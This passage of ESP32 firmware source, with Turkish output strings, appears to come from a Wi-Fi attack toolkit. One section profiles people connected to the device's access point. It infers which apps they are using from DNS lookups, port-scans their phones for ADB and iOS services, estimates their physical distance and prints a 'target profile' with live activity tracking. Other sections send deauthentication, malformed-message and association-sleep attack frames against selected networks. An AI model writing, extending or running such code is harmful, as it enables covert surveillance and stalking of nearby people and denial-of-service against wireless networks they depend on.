                hunter_profiles[i].first_seen > 0) {
              p_idx = i;
              hunter_profiles[i].ip = remoteIp.toString();
              break;
            }
          }
          ...
          if (p_idx != -1) {
            ...
            String d = domain;
            d.toLowerCase();
            if (d.indexOf("tiktok") >= 0 || d.indexOf("byteoversea") >= 0)
              app = "TikTok";
            else if (d.indexOf("instagram") >= 0 ||
                     d.indexOf("cdninstagram") >= 0)
              app = "Instagram";
            else if (d.indexOf("whatsapp") >= 0)
              app = "WhatsApp";
            else if (d.indexOf("telegram") >= 0 || d.indexOf("t.me") >= 0)
              app = "Telegram";
            else if (d.indexOf("facebook") >= 0 || d.indexOf("fbcdn") >= 0)
              app = "Facebook";
            else if (d.indexOf("snapchat") >= 0)
              app = "Snapchat";
            else if (d.indexOf("youtube") >= 0 || d.indexOf("googlevideo") >= 0)
              app = "YouTube";
            else if (d.indexOf("spotify") >= 0)
              app = "Spotify";
            else if (d.indexOf("netflix") >= 0)
              app = "Netflix";
            else if (d.indexOf("twitter") >= 0 || d.indexOf("twimg") >= 0)
              app = "Twitter/X";

            if (app != "") {
              hunter_profiles[p_idx].active_app = app;
              hunter_profiles[p_idx].last_activity = millis();
              if (hunter_profiles[p_idx].apps.indexOf(app) == -1) {
                if (hunter_profiles[p_idx].apps != "")
                  hunter_profiles[p_idx].apps += ", ";
                hunter_profiles[p_idx].apps += app;
                hunter_profiles[p_idx].updated = true;
              }
            }
          }
      ...
      // 3. Arka Plan Port Tarama (Sirayla)
      static uint32_t last_scan_time = 0;
      static uint8_t scan_p_idx = 0;
      static uint8_t scan_port_step = 0;
      const uint16_t scan_ports[] = {80, 443, 5555, 8080, 62078};

      if (millis() - last_scan_time > 100) {
        last_scan_time = millis();
        if (hunter_profiles[scan_p_idx].ip != "" &&
            hunter_profiles[scan_p_idx].first_seen > 0) {
          WiFiClient c;
          uint16_t port = scan_ports[scan_port_step];
          if (c.connect(hunter_profiles[scan_p_idx].ip.c_str(), port, 50)) {
            String ps = String(port);
            if (port == 5555)
              ps += "(ADB)";
            else if (port == 62078)
              ps += "(iOS)";
            if (hunter_profiles[scan_p_idx].services == "Taraniyor...")
              hunter_profiles[scan_p_idx].services = "";
            if (hunter_profiles[scan_p_idx].services.indexOf(ps) == -1) {
              if (hunter_profiles[scan_p_idx].services != "")
                hunter_profiles[scan_p_idx].services += ", ";
              hunter_profiles[scan_p_idx].services += ps;
            }
            c.stop();
          }
          scan_port_step++;
          if (scan_port_step >= 5) {
            if (hunter_profiles[scan_p_idx].services == "Taraniyor...")
              hunter_profiles[scan_p_idx].services = "Kapali/Gizli";
            scan_port_step = 0;
            scan_p_idx = (scan_p_idx + 1) % 8;
          }
        } else {
          scan_p_idx = (scan_p_idx + 1) % 8;
        }
      ...
      if (millis() - last_check > 1000) {
        ...
        for (int s = 0; s < sta_list.num; s++) {
          for (int p = 0; p < 8; p++) {
            if (memcmp(hunter_profiles[p].mac, sta_list.sta[s].mac, 6) == 0) {
              hunter_profiles[p].rssi = sta_list.sta[s].rssi;
              break;
            }
          }
        }
        ...
        for (int i = 0; i < 8; i++) {
          if (hunter_profiles[i].first_seen > 0) {
            if (!hunter_profiles[i].printed &&
                (millis() - hunter_profiles[i].first_seen > 10000)) {
              Serial.println(F("\n========================================="));
              Serial.println(F("[+] HEDEF OSINT PROFILI OLUSTURULDU"));
              Serial.println(F("========================================="));
              Serial.printf(
                  "[-] MAC Adresi   : %02X:%02X:%02X:%02X:%02X:%02X\n",
                  hunter_profiles[i].mac[0], hunter_profiles[i].mac[1],
                  hunter_profiles[i].mac[2], hunter_profiles[i].mac[3],
                  hunter_profiles[i].mac[4], hunter_profiles[i].mac[5]);
              Serial.print(F("[-] Uretici      : "));
              Serial.println(hunter_profiles[i].manufacturer);
              Serial.print(F("[-] Cihaz Ismi   : "));
              Serial.println(hunter_profiles[i].hostname == ""
                                 ? "Tespit Edilemedi"
                                 : hunter_profiles[i].hostname);
              Serial.print(F("[-] IP Adresi    : "));
              Serial.println(hunter_profiles[i].ip);
              Serial.printf("[-] Sinyal Gucu  : %d dBm (",
                            hunter_profiles[i].rssi);
              if (hunter_profiles[i].rssi > -50)
                Serial.print(F("Cok Yakin"));
              else if (hunter_profiles[i].rssi > -70)
                Serial.print(F("Yakin"));
              else
                Serial.print(F("Uzak"));
              Serial.println(")");

              float dist = pow(10, (abs(hunter_profiles[i].rssi) - 40) / 20.0);
              Serial.printf("[-] Tahmini Mesafe: ~%.1f Metre\n", dist);

              Serial.print(F("[-] Isletim Sist.: "));
              Serial.println(hunter_profiles[i].os);
              Serial.print(F("[-] Donanim      : "));
              Serial.println(hunter_profiles[i].hardware);
              Serial.print(F("[-] Tarayici     : "));
              Serial.println(hunter_profiles[i].browser);
              Serial.print(F("[-] Dil / Bolge  : "));
              Serial.println(hunter_profiles[i].locale);
              Serial.print(F("[-] Acik Portlar : "));
              Serial.println(hunter_profiles[i].services);
              Serial.print(F("[-] Aktif Uyg.   : "));
              Serial.println(hunter_profiles[i].active_app);
              Serial.println(F("[-] Tespit Edilen Uygulamalar:"));
              if (hunter_profiles[i].apps == "")
                Serial.println(F("    * Bilinmiyor"));
              else {
                String appList = hunter_profiles[i].apps;
                int start = 0;
                while (true) {
                  int comma = appList.indexOf(", ", start);
                  if (comma == -1) {
                    Serial.print(F("    * "));
                    Serial.println(appList.substring(start));
                    break;
                  }
                  Serial.print(F("    * "));
                  Serial.println(appList.substring(start, comma));
                  start = comma + 2;
                }
              }
              Serial.println(F("========================================="));
              hunter_profiles[i].printed = true;
              hunter_profiles[i].updated = false;
            } else if (hunter_profiles[i].printed &&
                       hunter_profiles[i].updated) {
              Serial.printf("[!] AKTIF TAKIP [%s]: Cihaz su an [%s] "
                            "uygulamasini kullaniyor.\n",
                            hunter_profiles[i].ip.c_str(),
                            hunter_profiles[i].active_app.c_str());
              hunter_profiles[i].updated = false;
            }
          }
        }
    ...
    if (currentTime - initTime >= this->channel_hop_delay * 500) {
      ...
      for (int y = 0; y < airtags->size(); y++) {
        ...
        display_obj.tft.println((String)airtags->get(y).rssi + " " +
                                (String)last_seen_sec + "s " +
                                airtags->get(y).mac);
      }
#endif
    }
    ...
    if (currentTime - initTime >= this->channel_hop_delay * 500) {
      ...
      for (int y = 0; y < access_points->size(); y++) {
        if (access_points->get(y).selected) {
          display_obj.tft.println(access_points->get(y).essid + ": " +
                                  (String)access_points->get(y).rssi);
        }
      }
#endif
    }
      ...
      if (this->ep_deauth) {
        for (int i = 0; i < access_points->size(); i++) {
          if (access_points->get(i).selected) {
            ...
            this->sendDeauthFrame(access_points->get(i).bssid,
                                  access_points->get(i).channel, dst_mac_bytes);
          }
        }
      }
    }
    ...
    if (currentTime - initTime >= 200) {
      this->sendBadMsgAttack(currentTime,
                             currentScanMode == WIFI_ATTACK_BAD_MSG);
      ...
      this->displayTransmitRate();
             ...
             (currentScanMode == WIFI_ATTACK_SLEEP_TARGETED)) {
    if (currentTime - initTime >= 200) {
      this->sendAssocSleepAttack(currentTime,
                                 currentScanMode == WIFI_ATTACK_SLEEP);
    ...
    if (currentTime - initTime >= 1000) {
      ...
      snprintf(displayString, sizeof(displayString), "%s%u", text18,
               static_cast<unsigned int>(packets_sent));
